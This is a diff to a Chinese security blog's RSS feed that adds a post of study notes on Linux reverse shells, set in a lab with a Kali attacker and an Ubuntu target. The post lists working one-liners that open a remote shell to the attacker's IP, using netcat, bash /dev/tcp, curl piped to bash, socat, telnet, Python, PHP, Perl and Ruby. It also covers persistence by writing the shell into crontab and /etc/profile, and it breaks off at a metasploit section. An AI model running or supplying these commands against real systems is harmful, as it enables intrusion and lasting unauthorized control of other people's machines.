@@ -5,16 +5,167 @@
         <link>http://chungod.github.io</link>
         <description>欢迎来到我的博客(*^﹏^*),本人为新人,你可以阅读我的学习笔记并提出独到的见解~我们将互相学习,共同进步,望大佬们勿喷</description>
         <language>zh-CN</language>
-        <pubDate>Wed, 05 May 2021 15:17:48 +0800</pubDate>
-        <lastBuildDate>Wed, 05 May 2021 15:17:48 +0800</lastBuildDate>
-        <category>Windows内核提权</category>
+        <pubDate>Fri, 14 May 2021 20:19:41 +0800</pubDate>
+        <lastBuildDate>Fri, 14 May 2021 20:19:41 +0800</lastBuildDate>
+        <category>Linux反弹shell多种姿态</category>
         <category>Linux提权</category>
-        <category>paramiko模块介绍</category>
+        <category>Windows内核提权</category>
         <category>php危险函数</category>
+        <category>paramiko模块介绍</category>
         <category>内存取证</category>
         <category>meterpreter学习笔记</category>
         <category>溯源取证总结</category>
         <category>upload-labs通关记录</category>
+        <item>
+            <guid isPermalink="true">http://chungod.github.io/2021/05/14/Linux%E5%8F%8D%E5%BC%B9shell%E5%A4%9A%E7%A7%8D%E5%A7%BF%E6%80%81/</guid>
+            <title>Linux反弹shell多种姿态</title>
+            <link>http://chungod.github.io/2021/05/14/Linux%E5%8F%8D%E5%BC%B9shell%E5%A4%9A%E7%A7%8D%E5%A7%BF%E6%80%81/</link>
+            <category>Linux反弹shell多种姿态</category>
+            <pubDate>Fri, 14 May 2021 20:19:41 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;linux-反弹shell多种姿态&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux-反弹shell多种姿态&#34;&gt;#&lt;/a&gt; Linux 反弹 shell 多种姿态&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;原理:反弹shell就是控制端监听在某TCP/UDP端口，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;一般反弹 shell 分为两种&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;正向连接&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;用于情况一般为我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;反向连接&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;反弹 shell 通常适用于如下几种情况：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;目标机因防火墙受限，目标机器只能发送请求，不能接收请求。&lt;/li&gt;
+&lt;li&gt;目标机端口被占用。&lt;/li&gt;
+&lt;li&gt;目标机位于局域网，或 IP 会动态变化，攻击机无法直接连接。&lt;/li&gt;
+&lt;li&gt;对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;实验坏境&lt;/p&gt;
+&lt;p&gt;攻击机：Kali（172.16.9.200）&lt;/p&gt;
+&lt;p&gt;目标主机：Ubuntu（172.16.9.199）&lt;/p&gt;
+&lt;h3 id=&#34;普通反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#普通反弹shell&#34;&gt;#&lt;/a&gt; 普通反弹 shell&lt;/h3&gt;
+&lt;p&gt;攻击机开启本地监听&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 3333&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;目标机主动连接攻击机&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;netcat 172.16.9.200 3333 -e /bin/bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;执行效果：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514112125091.png&#34; alt=&#34;image-20210514112125091&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514112117079.png&#34; alt=&#34;image-20210514112117079&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;利用bash反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用bash反弹shell&#34;&gt;#&lt;/a&gt; 利用 Bash 反弹 shell&lt;/h3&gt;
+&lt;p&gt;攻击机开启本地监听&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 3333&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;目标机主动连接攻击机&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/172.16.9.200/3333 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;执行效果，直接获取到 bash&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514112313985.png&#34; alt=&#34;image-20210514112313985&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514112324027.png&#34; alt=&#34;image-20210514112324027&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;curl配合bash反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#curl配合bash反弹shell&#34;&gt;#&lt;/a&gt; Curl 配合 Bash 反弹 shell&lt;/h3&gt;
+&lt;p&gt;攻击机开启本地监听&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 3333&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;目标机 这里操作也很简单，借助了 Linux 中的管道&lt;/p&gt;
+&lt;p&gt;首先，在攻击者 vps 的 web 目录里面创建一个 &lt;code&gt;index文件&lt;/code&gt; （index.php 或 index.html），内容如下：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;vim /var/www/html/index.html&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/172.16.9.200/3333 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;并开启 3333 端口的监听，然后再目标机上执行如下，即可反弹 shell：&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514112954090.png&#34; alt=&#34;image-20210514112954090&#34;&gt;&lt;/p&gt;
+&lt;p&gt;执行效果：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514113144365.png&#34; alt=&#34;image-20210514113144365&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514113155864.png&#34; alt=&#34;image-20210514113155864&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Curl 配合 Bash 反弹 shell 的方式在 CTF 题目中经常出现， &lt;code&gt;curl IP|bash&lt;/code&gt;  中的 IP 可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。&lt;/p&gt;
+&lt;h3 id=&#34;写入定时任务反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#写入定时任务反弹shell&#34;&gt;#&lt;/a&gt; 写入定时任务反弹 shell&lt;/h3&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 /var/spool/cron/[crontabs]/&amp;lt;username&amp;gt; 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;当前用户名为 root，我们就要将下面内容写入到 /var/spool/cron/root 中。(centos 系列主机)&lt;/li&gt;
+&lt;li&gt;当前用户名为 root，我们就要将下面内容写入到 /var/spool/cron/crontabs/root 中。(Debian/Ubuntu 系列主机)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;实现效果&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514142719763.png&#34; alt=&#34;image-20210514142719763&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514142726506.png&#34; alt=&#34;image-20210514142726506&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;写入etcprofile文件反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#写入etcprofile文件反弹shell&#34;&gt;#&lt;/a&gt; 写入 /etc/profile 文件反弹 shell&lt;/h3&gt;
+&lt;p&gt;将以下反弹 shell 的命写入 /etc/profile 文件中，/etc/profile 中的内容会在用户打开 bash 窗口时执行。&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/172.16.9.200/3333 0&amp;gt;&amp;amp;1 &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514142942758.png&#34; alt=&#34;image-20210514142942758&#34;&gt;&lt;/p&gt;
+&lt;p&gt;当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的 shell：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514143946125.png&#34; alt=&#34;image-20210514143946125&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514144000488.png&#34; alt=&#34;image-20210514144000488&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;利用socat反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用socat反弹shell&#34;&gt;#&lt;/a&gt; 利用 socat 反弹 shell&lt;/h3&gt;
+&lt;p&gt;攻击机开启本地监听&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;socat TCP-LISTEN:2222 - 或&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 2222&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;目标机主动连接主机&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;socat tcp-connect:172.16.9.200:2222 exec:&amp;#x27;bash -li&amp;#x27;,ptr,stderr,setsid,sight,sane&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;实现效果&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514145043081.png&#34; alt=&#34;image-20210514145043081&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514145051036.png&#34; alt=&#34;image-20210514145051036&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;利用telnet反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用telnet反弹shell&#34;&gt;#&lt;/a&gt; 利用 telnet 反弹 shell&lt;/h3&gt;
+&lt;p&gt;攻击机开启本地监听&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 2222&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;目标机主动连接主机&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mknod a p; telnet 172.16.9.200 2222 0&amp;lt;a | /bin/bash 1&amp;gt;a&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;实现效果&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514145347386.png&#34; alt=&#34;image-20210514145347386&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514145359190.png&#34; alt=&#34;image-20210514145359190&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;各种脚本反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#各种脚本反弹shell&#34;&gt;#&lt;/a&gt; 各种脚本反弹 shell&lt;/h2&gt;
+&lt;h3 id=&#34;python脚本反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#python脚本反弹shell&#34;&gt;#&lt;/a&gt; python 脚本反弹 shell&lt;/h3&gt;
+&lt;p&gt;攻击机开启本地监听&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 2222&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;目标机主动连接主机&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python -c &lt;span class=&#34;string&#34;&gt;&amp;#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;172.16.9.200&amp;quot;,2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514145830300.png&#34; alt=&#34;image-20210514145830300&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514145838061.png&#34; alt=&#34;image-20210514145838061&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;php脚本反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php脚本反弹shell&#34;&gt;#&lt;/a&gt; php 脚本反弹 shell&lt;/h3&gt;
+&lt;p&gt;攻击机开启本地监听&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 2222&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;目标机主动连接主机 (一)&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;php -r &lt;span class=&#34;string&#34;&gt;&amp;#x27;$sock=fsockopen(&amp;quot;172.16.9.200&amp;quot;,2222);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514150401946.png&#34; alt=&#34;image-20210514150401946&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514150354093.png&#34; alt=&#34;image-20210514150354093&#34;&gt;&lt;/p&gt;
+&lt;p&gt;目标机主动连接主机 (二)&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;php -r &lt;span class=&#34;string&#34;&gt;&amp;#x27;exec(&amp;quot;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/172.16.9.200/2222 0&amp;gt;&amp;amp;1&amp;quot;);&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;实现效果&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514151453583.png&#34; alt=&#34;image-20210514151453583&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514151533954.png&#34; alt=&#34;image-20210514151533954&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;perl脚本反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#perl脚本反弹shell&#34;&gt;#&lt;/a&gt; perl 脚本反弹 shell&lt;/h3&gt;
+&lt;p&gt;攻击机开启本地监听&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 2222&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;目标主机连接攻击机&lt;/p&gt;
+&lt;figure class=&#34;highlight perl&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;perl -e &lt;span class=&#34;string&#34;&gt;&amp;#x27;use Socket;$i=&amp;quot;172.16.9.200&amp;quot;;$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&amp;#123;open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);&amp;#125;;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;实现效果&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514152127846.png&#34; alt=&#34;image-20210514152127846&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514152135839.png&#34; alt=&#34;image-20210514152135839&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;ruby脚本反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ruby脚本反弹shell&#34;&gt;#&lt;/a&gt; Ruby 脚本反弹 shell&lt;/h3&gt;
+&lt;p&gt;攻击机开启本地监听&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 2222&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;目标主机连接攻击机&lt;/p&gt;
+&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ruby -rsocket -e &lt;span class=&#34;string&#34;&gt;&amp;#x27;c=TCPSocket.new(&amp;quot;172.16.9.200&amp;quot;,&amp;quot;2222&amp;quot;);while(cmd=c.gets);IO.popen(cmd,&amp;quot;r&amp;quot;)&amp;#123;|io|c.print io.read&amp;#125;end&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;或&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ruby -rsocket -e &lt;span class=&#34;string&#34;&gt;&amp;#x27;exit if fork;c=TCPSocket.new(&amp;quot;172.16.9.200&amp;quot;,&amp;quot;2222&amp;quot;);while(cmd=c.gets);IO.popen(cmd,&amp;quot;r&amp;quot;)&amp;#123;|io|c.print io.read&amp;#125;end&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;实现效果&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514153951128.png&#34; alt=&#34;image-20210514153951128&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514153957273.png&#34; alt=&#34;image-20210514153957273&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;利用metasploit生成反弹shell一句话&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用metasploit生成反弹shell一句话&#34;&gt;#&lt;/a&gt; 利用 metasploit 生成反弹 shell 一句话&lt;/h3&gt;
+&lt;p&gt;攻击机开启本地监听&lt;/p&gt;
